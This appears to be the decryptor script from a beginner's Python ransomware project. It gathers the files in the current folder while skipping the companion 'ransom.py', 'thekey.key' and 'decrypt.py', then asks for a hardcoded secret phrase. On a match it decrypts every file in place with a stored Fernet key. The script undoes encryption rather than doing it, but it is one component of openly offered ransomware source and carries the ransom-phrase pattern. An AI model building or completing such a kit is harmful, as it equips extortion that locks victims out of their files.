import os
from cryptography.fernet import Fernet 

files = []

#search for files in our directory, only specifically including files, ignoring the key

for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py": 
        continue 
    if os.path.isfile(file):
        files.append(file) 

print(files) 


key = Fernet.generate_key() 

#open key file and set it as a variable

with open("thekey.key", "rb") as key:
    secretkey = key.read() 

#create a phrase the needs to be entered to unencrypt files

secretphrase = "Tony" 

user_phrase = input("Enter the secret phrase to decrypt your files.\n") 



#open files, decrypts, then writes back to the file

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read() 
        contents_decrypted = Fernet(secretkey).decrypt(contents) 
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted) 
    print("Your files have been decrypted.\n") 
else: 
    print("Sorry, wrong secret phrase.\n") 


